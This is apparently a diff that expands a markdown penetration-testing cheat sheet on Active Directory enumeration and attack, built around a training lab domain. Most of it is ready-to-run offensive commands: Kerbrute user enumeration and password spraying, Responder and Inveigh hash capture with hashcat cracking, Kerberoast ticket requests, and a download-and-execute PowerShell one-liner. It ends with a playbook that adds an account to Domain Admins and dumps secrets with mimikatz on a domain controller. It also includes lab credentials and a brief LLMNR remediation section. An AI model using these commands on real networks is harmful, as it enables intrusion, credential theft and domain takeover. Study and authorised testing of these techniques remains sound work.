@@ -4,6 +4,104 @@ Once you can see a Domain Controller, the goal is to map users, groups, computer
 
 ---
 
+### Tools of the Trade
+
+| Tool | What it's for |
+|------|---------------|
+| **PowerView / SharpView** | PowerShell + .NET situational awareness — replacement for Windows `net*` commands. Good for "what else does this credential get me" sweeps. |
+| **BloodHound** | Visual map of AD relationships and attack paths. Neo4j-backed; ingests SharpHound / BloodHound.py output. |
+| **SharpHound** | C# collector for BloodHound — pulls users, groups, computers, ACLs, GPOs, sessions. Outputs JSON. |
+| **BloodHound.py** | Python ingestor — runs from a non-domain-joined Kali. |
+| **Kerbrute** | Go tool — uses Kerberos pre-auth to enum users, spray passwords, brute-force. |
+| **Impacket** | Python toolkit — most of the AD attack scripts you'll use (`secretsdump`, `GetNPUsers`, `GetUserSPNs`, `ntlmrelayx`, etc.). |
+| **Responder** | Poisons LLMNR / NBT-NS / mDNS — captures NetNTLM hashes on the wire. |
+| **Inveigh / InveighZero** | Responder for Windows (PowerShell / C#). |
+| **rpcclient** | Samba RPC client — null-session enumeration, user lookups. |
+| **rpcinfo** | RPC service map on a target. |
+| **netexec (CME)** | Multi-protocol auth + enum + exploitation (SMB / WinRM / LDAP / MSSQL / SSH). |
+| **Rubeus** | C# Kerberos abuse — Kerberoast, AS-REP roast, PtT, S4U, dump tickets. |
+| **GetUserSPNs.py** | Impacket — Kerberoast all SPN-bearing accounts. |
+| **GetNPUsers.py** | Impacket — AS-REP roast pre-auth-disabled accounts. |
+| **enum4linux / enum4linux-ng** | Windows / Samba enumeration helper. |
+| **ldapsearch / windapsearch** | LDAP querying — windapsearch automates common AD queries. |
+| **DomainPasswordSpray.ps1** | PowerShell password spray from a domain-joined Windows host. |
+| **LAPSToolkit** | Audit / abuse Microsoft LAPS deployments. |
+| **smbmap / smbclient** | Share enumeration / interaction. |
+| **psexec.py / wmiexec.py / smbexec.py / mssqlclient.py** | Impacket execution variants. |
+| **Snaffler** | File-share crawler — finds creds in configs, scripts, etc. |
+| **smbserver.py** | Impacket SMB server — easy file transfers in / out of Windows. |
+| **setspn.exe** | Read/modify SPN directory property on AD service accounts. |
+| **Mimikatz** | Cred dump, PtH, ticket extraction. |
+| **secretsdump.py** | Impacket — remote SAM / LSA / NTDS dump. |
+| **evil-winrm** | WinRM shell with hash / cert / Kerberos auth. |
+| **noPac.py** | CVE-2021-42278 + 42287 — standard user → DA impersonation. |
+| **rpcdump.py** | RPC endpoint mapper. |
+| **CVE-2021-1675.py** | PrintNightmare PoC. |
+| **ntlmrelayx.py** | SMB / LDAP / HTTP relay. |
+| **PetitPotam.py** | CVE-2021-36942 — EFSRPC auth coercion. |
+| **gettgtpkinit.py / getnthash.py** | PKINIT TGT request + U2U PAC NT-hash extraction. |
+| **adidnsdump** | Dump AD-integrated DNS records (like a zone transfer). |
+| **gpp-decrypt** | Recover cleartext from cached Group Policy Preferences passwords. |
+| **lookupsid.py** | SID brute force. |
+| **ticketer.py** | Forge / customize TGT / TGS (golden, child→parent). |
+| **raiseChild.py** | Impacket — automated child → parent escalation. |
+| **AD Explorer** | GUI AD viewer / editor — snapshot for offline analysis. |
+| **PingCastle** | AD risk-assessment audit. |
+| **Group3r** | GPO misconfiguration audit. |
+| **ADRecon** | AD environment data extract → Excel summary. |
+
+#### Adding a binary to PATH
+
+```bash
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O <name>
+chmod +x <name>
+sudo mv <name> /usr/local/bin/
+```
+
+### External Recon (before any internal access)
+
+What you're looking for vs. where to find it:
+
+| Data point | Looking for | Sources |
+|------------|-------------|---------|
+| **IP space** | ASN, public netblocks, cloud presence, DNS records | IANA, ARIN, RIPE, BGP Toolkit |
+| **Domain info** | Registrar, subdomains, mail/DNS/VPN portals, defenses | DomainTools, ICANN, manual DNS against 8.8.8.8 |
+| **Schema format** | Email patterns, AD usernames, password policy | LinkedIn, Twitter, About Us / Contact pages, embedded doc metadata |
+| **Data disclosures** | Internal-site references, share names, hardware/software details | GitHub, S3 buckets, Azure Blob, Google dorks |
+| **Breach data** | Cleartext passwords / hashes for spray reuse | HaveIBeenPwned, Dehashed |
+
+Useful Google dorks once you know the domain:
+
+```bash
+filetype:pdf inurl:inlanefreight.com
+intext:"@inlanefreight.com" inurl:inlanefreight.com
+```
+
+LinkedIn → usernames:
+
+```bash
+linkedin2username.py -c COMPANY [-n DOMAIN] [-d DEPTH] [-s SLEEP] [-x PROXY] [-k KEYWORDS] [-g] [-o OUTPUT]
+```
+
+Dehashed for cleartext from breaches:
+
+```bash
+python3 dehashed.py -q inlanefreight.local -p
+```
+
+### Internal Discovery (once you have a pivot)
+
+```bash
+## Capture ARP on the pivot to spot live hosts
+wireshark                                # filter: arp
+
+## Subnet sweep
+fping -asgq 172.16.5.0/23
+
+## Enumerate the hosts you found
+nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
+```
+
 ### Quick Wins (before you have creds)
 
 ```bash
@@ -37,6 +135,46 @@ for i in $(seq 500 2000); do
 done
 ```
 
+#### Anonymous LDAP bind
+
+```bash
+ldapsearch -h <dc-ip> -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \
+  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+#### enum4linux from SMB null session
+
+```bash
+enum4linux -U <dc-ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+### Getting That First User (Kerbrute)
+
+Stealthier than SMB / LDAP probing — uses Kerberos pre-auth packets.
+
+Wordlists worth trying first:
+
+- All of SecLists
+- <https://github.com/insidetrust/statistically-likely-usernames>
+- Output of `linkedin2username.py`
+
+```bash
+## Basic enum
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt
+
+## Build a clean valid-user list
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt 2>&1 \
+  | sed 's/\x1b\[[0-9;]*m//g' \
+  | grep "VALID USERNAME" \
+  | awk '{print $NF}' | cut -d '@' -f1 \
+  | sort -u > valid_ad_users.txt
+
+## Password spray
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
+```
+
+> If clock skew breaks Kerberos: `sudo ntpdate <dc-ip>` or `sudo date -s "<time>"`.
+
 ### LDAP
 
 ```bash
@@ -57,50 +195,94 @@ nxc ldap <dc-ip> -d <domain> -u <user> -p <pass> --computers \
 dig +short <machine>.<domain> @<dc-ip>
 ```
 
-### enum4linux-ng
-
-SMB + LDAP one-shot:
+#### windapsearch — common queries one command at a time
 
 ```bash
-enum4linux-ng -A -u 'user' -p 'pass' <ip>
+## Privileged users
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
+## Domain Admins
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
 ```
 
-### Kerbrute
+#### Direct LDAP query through netexec
 
 ```bash
-## Install
-wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
-chmod +x kerbrute_linux_amd64
-sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
-
-## Username enumeration
-kerbrute userenum --dc <dc-ip> -d <domain> users.txt
-
-## Password spray (clock skew must be < 3h)
-while IFS= read -r line; do
-  kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt "$line"
-done < trim_pass.txt | grep "VALID LOGIN"
+nxc ldap 10.129.31.188 -u 'user' -p 'pass' \
+    --query "(displayName=Betty Ross)" "sAMAccountName memberOf"
 ```
 
-⚠ If clock skew breaks Kerberos, fix it: `sudo ntpdate <dc-ip>` or `sudo date -s "<time>"`.
+#### Count members of a group via CME
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u dbranch -p Winter2022 --groups | grep "Interns"
+```
+
+### LLMNR / NBT-NS Poisoning
+
+#### Responder (Linux pivot)
+
+Runs at layer 2 — **must** be on the pivot host directly, not tunneled through Ligolo/Chisel. Needs root.
+
+```bash
+sudo responder -I <int-connected-to-internal>
+```
+
+Hashes stored at `/usr/share/responder/logs/` (or `./logs/` for git installs).
+
+Crack the NetNTLMv2:
+
+```bash
+hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
+```
+
+#### Inveigh (Windows pivot, elevated shell)
+
+Check the .NET version, then pull the matching binary:
+
+```bash
+reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release
+.\Inveigh.exe
+```
+
+Inside Inveigh:
+
+```bash
+GET NTLMV2UNIQUE             # show unique captures
+GET NTLMV2USERNAMES          # show captured usernames
+```
+
+#### Remediation (for the report)
+
+Disable LLMNR and NBT-NS:
+
+- **LLMNR** — Computer Configuration → Administrative Templates → Network → DNS Client → enable "Turn OFF Multicast Name Resolution"
+- **NBT-NS** — push a startup script via GPO:
+
+```powershell
+$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
+Get-ChildItem $regkey | foreach {
+    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
+}
+```
+
+Host the script on `SYSVOL`, link via a GPO to all hosts, then restart.
 
 ### BloodHound
 
-#### Easy way — remote collection from Kali
+#### Remote collection from Kali
 
 ```bash
-bloodhound-python -u <user> -p '<pass>' -d <domain>.local -ns <dc-ip> -c All
+bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
 ```
 
-#### Manual way — SharpHound on a victim
-
-On Windows host:
+#### SharpHound on a domain host
 
 ```powershell
 Invoke-Bloodhound -CollectionMethod All -Domain <DOM>.local -ZipFileName loot.zip
 ```
 
-Pull `loot.zip` back to Kali:
+Pull the zip back to Kali:
 
 ```bash
 scp Administrator@<victim>:/C:<loot-path> .
@@ -110,25 +292,243 @@ scp Administrator@<victim>:/C:<loot-path> .
 
 ```bash
 sudo apt install bloodhound
-neo4j console &        # or systemctl start neo4j
-bloodhound             # login admin:admin
-## Upload loot.zip / json dirs in the UI
+bloodhound-start                       # convenience wrapper
+neo4j console &                        # or systemctl start neo4j
+bloodhound                             # login neo4j:neo4j
 ```
 
-Use the pre-built queries:
+Pre-built queries worth running first:
+
 - *Shortest paths to Domain Admins*
 - *Users with DCSync*
 - *Kerberoastable users*
 - *AS-REP Roastable users*
 - *Computers where this user has admin rights*
+- *Find Computers where Domain Users are Local Admin*
 
-### Server Manager (after RDP into a DC)
+#### Cypher queries worth keeping
 
 ```bash
-Tools → Active Directory Users and Computers   (GUI enum)
+## Users who can PSRemote
+MATCH p=(u:User)-[:CanPSRemote]->(c:Computer) RETURN p
+
+## AS-REP roastable accounts
+MATCH (u:User {dontreqpreauth: true}) RETURN u.name
 ```
 
+### From Inside a Windows Host — ActiveDirectory Module
+
+```powershell
+Import-Module ActiveDirectory
+
+Get-ADDomain
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # Kerberoastable
+Get-ADTrust -Filter *
+Get-ADGroup -Filter * | select name
+Get-ADGroup -Identity "Backup Operators"
+Get-ADGroupMember -Identity "Backup Operators"
+```
+
+### PowerView (the heavyweight)
+
+```powershell
+Import-Module .\PowerView.ps1
+```
+
+| Cmd-Let | Purpose |
+|---------|---------|
+| `Export-PowerViewCSV` | Append results to CSV |
+| `ConvertTo-SID` | User/group name → SID |
+| `Get-DomainSPNTicket` | Request TGS for a given SPN |
+| `Get-Domain` | Current (or specified) domain object |
+| `Get-DomainController` | DCs in the domain |
+| `Get-DomainUser` | Users (filterable) |
+| `Get-DomainComputer` | Computers |
+| `Get-DomainGroup` | Groups |
+| `Get-DomainOU` | OUs |
+| `Find-InterestingDomainAcl` | ACLs with modify rights set to non-built-ins |
+| `Get-DomainGroupMember` | Members of a specific group |
+| `Get-DomainFileServer` | Hosts likely acting as file servers |
+| `Get-DomainDFSShare` | DFS shares in the domain |
+| `Get-DomainGPO` | GPOs |
+| `Get-DomainPolicy` | Default domain / DC policy |
+| `Get-NetLocalGroup` | Local groups (local or remote) |
+| `Get-NetLocalGroupMember` | Members of a specific local group |
+| `Get-NetShare` | Open shares |
+| `Get-NetSession` | Logon sessions on a host |
+| `Test-AdminAccess` | Do *you* have local admin on this host? |
+| `Find-DomainUserLocation` | Where a specific user is currently logged in |
+| `Find-DomainShare` | Reachable shares across the domain |
+| `Find-InterestingDomainShareFile` | File-content search across readable shares |
+| `Find-LocalAdminAccess` | Hosts where the *current user* has local admin |
+| `Get-DomainTrust` / `Get-ForestTrust` | Domain / forest trusts |
+| `Get-DomainForeignUser` | Users in groups outside their own domain |
+| `Get-DomainForeignGroupMember` | Groups containing users from other domains |
+| `Get-DomainTrustMapping` | Enumerate all trusts reachable from here |
+
+Notable one-liners:
+
+```powershell
+## Full user object dump
+Get-DomainUser -Identity mmorgan -Domain inlanefreight.local |
+    Select-Object -Property name,samaccountname,description,memberof,whencreated,
+        pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,
+        serviceprincipalname,useraccountcontrol
+
+## Recursive group expansion
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+## Trust map
+Get-DomainTrustMapping
+
+## Local admin test
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+## Kerberoastable accounts + grab a ticket
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
+```
+
+### Snaffler — Find Creds in Shares
+
+```powershell
+Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+```
+
+Run it once, then grep the log for config strings and connection strings later:
+
+```powershell
+Select-String -Path .\snaffler.log -Pattern "connectionstring|data source|initial catalog|password=" -CaseSensitive:$false
+```
+
+### Windows Host With No Tooling — Built-in Enumeration
+
+#### Basic commands
+
+| Command | Result |
+|---------|--------|
+| `hostname` | PC name |
+| `[System.Environment]::OSVersion.Version` | OS version |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Installed hotfixes |
+| `ipconfig /all` | Network adapter config |
+| `set` | Env vars (cmd.exe) |
+| `echo %USERDOMAIN%` | Domain name |
+| `echo %logonserver%` | Logon DC |
+
+#### PowerShell helpers
+
+| Cmd-Let | Purpose |
+|---------|---------|
+| `Get-Module` | Loaded modules |
+| `Get-ExecutionPolicy -List` | Execution policy per scope |
+| `Set-ExecutionPolicy Bypass -Scope Process` | Temporarily bypass — reverts when the process exits |
+| `Get-ChildItem Env: \| ft Key,Value` | Env values |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | User's PowerShell history (creds, configs) |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL');<cmd>"` | Download + execute in memory |
+| `powershell.exe -version 2` | Downgrade — can break some blue-team logging |
+
+#### Networking
+
+| Command | Result |
+|---------|--------|
+| `arp -a` | ARP table |
+| `ipconfig /all` | Adapter settings |
+| `route print` | IPv4/IPv6 routing table |
+| `netsh advfirewall show allprofiles` | Firewall status |
+
+#### WMI
+
+| Command | Result |
+|---------|--------|
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Hotfixes |
+| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Host basics |
+| `wmic process list /format:list` | Process list |
+| `wmic ntdomain list /format:list` | Domain + DCs |
+| `wmic useraccount list /format:list` | Local + cached domain users |
+| `wmic group list /format:list` | Local groups |
+| `wmic sysaccount list /format:list` | Service accounts |
+
+#### net
+
+| Command | Result |
+|---------|--------|
+| `net accounts` | Password policy (local) |
+| `net accounts /domain` | Password + lockout policy (domain) |
+| `net group /domain` | Domain groups |
+| `net group "Domain Admins" /domain` | DA members |
+| `net group "Domain Controllers" /domain` | DCs |
+| `net group "domain computers" /domain` | Domain-joined computers |
+| `net localgroup` | Local groups |
+| `net localgroup administrators /domain` | Local admins (incl. DA by default) |
+| `net localgroup administrators [user] /add` | Add user to local admins |
+| `net share` | Current shares |
+| `net user <ACCOUNT> /domain` | User info |
+| `net user /domain` | All domain users |
+| `net user %username%` | Current user |
+| `net use x: \\<computer>\<share>` | Mount a share |
+| `net view` | Reachable computers |
+| `net view /all /domain[:dom]` | Shares across the domain |
+| `net view \\<computer> /ALL` | Shares on one host |
+
+#### dsquery (elevated)
+
+```bash
+dsquery user
+dsquery computer
+
+## Disabled accounts (UAC flag 32)
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" \
+    -attr distinguishedName userAccountControl
+```
+
+### Sample Attack Path (end-to-end playbook)
+
+1. Gain access to an external / internal pivot host.
+2. Set up Ligolo-ng on the pivot.
+3. `nmap` all internal subnets through the tunnel.
+4. `enum4linux-ng` everything that responds.
+5. Kerbrute the DC with likely usernames.
+6. Once you have one valid set of creds:
+   - Pull every user via CME and clean the list:
+     ```bash
+     crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee usernames.txt
+     cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee cleanusers.txt
+     ```
+   - Build a `user:pass` combo file and brute via kerbrute:
+     ```bash
+     awk 'NR==FNR{p[++np]=$0; next}{for(i=1;i<=np;i++) print $0 ":" p[i]}' \
+         2023-200_most_used_passwords.txt cleanusers.txt > combos.txt
+     cat combos.txt | kerbrute bruteforce -d inlanefreight.local --dc 172.16.7.3 -
+     ```
+7. Run Snaffler against reachable shares for cached connection strings / passwords.
+8. Either pivot with the new creds or escalate locally on the pivot.
+9. Once you have sudo / SYSTEM, run Responder / Inveigh for further hashes.
+10. Where BloodHound shows a `GenericWrite` edge → add yourself to a high-priv group:
+    ```bash
+    net group 'Domain Admins' ct059 /add /domain
+    ```
+    Enter a higher-priv session:
+    ```powershell
+    $cred = New-Object System.Management.Automation.PSCredential(
+        "INLANEFREIGHT\CT059",
+        (ConvertTo-SecureString "charlie1" -AsPlainText -Force))
+    Enter-PSSession -ComputerName DC01 -Credential $cred
+    ```
+11. DCs often have RDP disabled. To run mimikatz on the DC, use PSRemoting or PsExec:
+    ```powershell
+    ## via WinRM
+    Enter-PSSession -ComputerName DC01
+    cd C:\Windows\Temp
+    .\mimikatz.exe "privilege::debug" "lsadump::lsa /inject" "exit"
+
+    ## via PsExec from MS01
+    .\PsExec.exe \\DC01 -accepteula C:\Windows\Temp\mimikatz.exe `
+        "privilege::debug" "lsadump::lsa /inject" "exit"
+    ```
+
 ### See Also
-- [AD Initial Access](../3-exploitation/05-ad-initial-access.md) — ASREPRoasting, Kerberoasting, pass-the-hash.
-- [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.md) — constrained delegation, golden ticket.
+
+- [AD Initial Access](../3-exploitation/05-ad-initial-access.md) — ASREPRoasting, Kerberoasting, password spray, pass-the-hash.
+- [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.md) — constrained delegation, golden ticket, child→parent (ExtraSids).
 - [ACL Abuse with bloodyAD](../5-lateral-movement/04-acl-abuse-bloodyad.md) — once BloodHound shows you ACL paths.
+- [Credential Dumping](../4-post-exploitation/03-credential-dumping.md) — Mimikatz, secretsdump, NTDS.dit.
